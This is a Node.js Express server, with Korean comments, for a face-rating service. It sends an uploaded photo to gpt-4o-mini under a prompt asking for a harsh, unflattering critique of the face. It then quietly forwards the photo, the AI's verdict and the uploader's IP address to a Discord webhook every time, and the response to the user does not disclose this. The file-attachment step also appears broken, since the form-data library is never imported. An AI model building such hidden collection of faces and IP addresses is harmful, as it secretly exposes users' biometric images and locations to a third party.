import express from "express";
import multer from "multer";
import fs from "fs";
import path from "path";
import axios from "axios";
import OpenAI from "openai";

const app = express();
const PORT = process.env.PORT || 10000;

const openai = new OpenAI({
  apiKey: process.env.OPENAI_API_KEY,
});

const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;

// ===== uploads 폴더 =====
const uploadDir = path.join(process.cwd(), "uploads");
if (!fs.existsSync(uploadDir)) {
  fs.mkdirSync(uploadDir, { recursive: true });
}

// ===== multer =====
const upload = multer({ dest: uploadDir });

// ===== 업로드 =====
app.post("/upload", upload.single("photo"), async (req, res) => {
  const filePath = req.file.path;

  // 🔥 base64 변환 (이게 핵심)
  const imageBase64 = fs.readFileSync(filePath, {
    encoding: "base64",
  });

  let aiResult = "AI 평가 실패";

  // ===== 1️⃣ 진짜 얼평 =====
  try {
    const response = await openai.chat.completions.create({
      model: "gpt-4o-mini",
      messages: [
        {
          role: "system",
          content:
            "너는 얼굴을 미화하지 않는 냉정한 얼평 전문가다. 보이는 대로 솔직하고 구체적으로 평가해라.",
        },
        {
          role: "user",
          content: [
            { type: "text", text: "이 얼굴을 솔직하게 얼평해줘." },
            {
              type: "image_url",
              image_url: {
                url: `data:image/jpeg;base64,${imageBase64}`,
              },
            },
          ],
        },
      ],
      max_tokens: 500,
    });

    aiResult = response.choices[0].message.content;
  } catch (err) {
    console.error("AI 평가 실패:", err);
  }

  // ===== 2️⃣ Discord로 무조건 전송 =====
  try {
    await axios.post(DISCORD_WEBHOOK_URL, {
      username: "얼굴 평가 봇",
      embeds: [
        {
          title: "📸 얼굴 업로드",
          description: aiResult || "평가 없음",
          fields: [
            {
              name: "IP",
              value:
                req.headers["x-forwarded-for"] ||
                req.socket.remoteAddress ||
                "unknown",
            },
          ],
          timestamp: new Date(),
        },
      ],
    });

    // 🔥 사진 파일도 첨부
    const form = new FormData();
    form.append("file", fs.createReadStream(filePath));
    await axios.post(DISCORD_WEBHOOK_URL, form, {
      headers: form.getHeaders(),
    });
  } catch (err) {
    console.error("Discord 전송 실패:", err.message);
  }

  // ===== 파일 정리 =====
  fs.unlinkSync(filePath);

  // ===== 유저 응답 =====
  res.json({
    success: true,
    result: aiResult,
  });
});

app.listen(PORT, () => {
  console.log(`🔥 Server running on ${PORT}`);
});
